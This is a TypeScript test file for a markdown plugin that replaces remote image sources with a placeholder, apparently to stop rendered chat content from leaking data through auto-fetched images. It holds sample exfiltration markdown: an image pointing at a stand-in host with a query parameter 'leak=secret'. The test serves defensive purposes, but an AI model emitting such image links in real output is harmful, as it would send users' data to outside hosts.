import rehypeStringify from 'rehype-stringify'
import remarkParse from 'remark-parse'
import remarkRehype from 'remark-rehype'
import { unified } from 'unified'
import { describe, expect, it } from 'vitest'
import { BLOCKED_IMAGE_CHIP_TEXT, BLOCKED_IMAGE_CLASS, rehypeBlockRemoteImages } from '~/lib/rehypeBlockRemoteImages'

// The plugin in isolation (no link hardening): asserts the src allowlist itself. The
// wired-into-both-processors behavior is covered in markdownProcessor.test.ts.
const processor = unified()
  .use(remarkParse)
  .use(remarkRehype)
  .use(rehypeBlockRemoteImages)
  .use(rehypeStringify)

const render = (md: string) => String(processor.processSync(md))

describe('rehypeBlockRemoteImages', () => {
  it('replaces a remote https image with the explained placeholder, not an <img>', () => {
    const html = render('![diagram](https://evil.example/x.png?leak=secret)')
    expect(html).not.toContain('<img')
    // No `src=` at all: the URL must never end up on anything the page auto-fetches.
    expect(html).not.toContain('src=')
    expect(html).toContain(`class="${BLOCKED_IMAGE_CLASS}"`)
    expect(html).toContain(BLOCKED_IMAGE_CHIP_TEXT)
    // The URL survives only as an href/title the user can open deliberately -- never as
    // something the page fetches on its own.
    expect(html).toContain('href="https://evil.example/x.png?leak=secret"')
  })

  it('keeps the author alt text visible as the fallback', () => {
    expect(render('![a sequence diagram](https://cdn.example/d.png)')).toContain('>a sequence diagram<')
  })

  it('falls back to the URL as the label when there is no alt text', () => {
    const html = render('![](https://cdn.example/d.png)')
    expect(html).toContain('>https://cdn.example/d.png<')
  })

  it('blocks http, protocol-relative, relative and root-relative srcs (all are fetches)', () => {
    for (const src of ['http://evil.example/x.png', '//evil.example/x.png', './x.png', '/x.png', 'x.png']) {
      const html = render(`![shot](${src})`)
      expect(html, src).not.toContain('<img')
      expect(html, src).toContain(BLOCKED_IMAGE_CHIP_TEXT)
      expect(html, src).toContain('>shot<')
    }
  })

  it('blocks an empty src (it re-fetches the current document URL)', () => {
    const html = render('![shot]()')
    expect(html).not.toContain('<img')
    expect(html).toContain(BLOCKED_IMAGE_CHIP_TEXT)
  })

  it('lets a data: image through untouched (MCP tool results depend on it)', () => {
    const html = render('![shot](data:image/png;base64,iVBORw0KGgo=)')
    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="shot">')
    expect(html).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
  })

  it('lets a blob: image through untouched (the file viewer depends on it)', () => {
    const html = render('![shot](blob:http://localhost:3000/9a1f-uuid)')
    expect(html).toContain('<img src="blob:http://localhost:3000/9a1f-uuid" alt="shot">')
    expect(html).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
  })

  it('matches the inline schemes case-insensitively', () => {
    expect(render('![shot](DATA:image/png;base64,iVBORw0KGgo=)')).toContain('<img')
  })

  it('leaves non-image elements alone', () => {
    const html = render('[link](https://example.com)\n\ntext')
    expect(html).toContain('<a href="https://example.com">link</a>')
    expect(html).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
  })
})
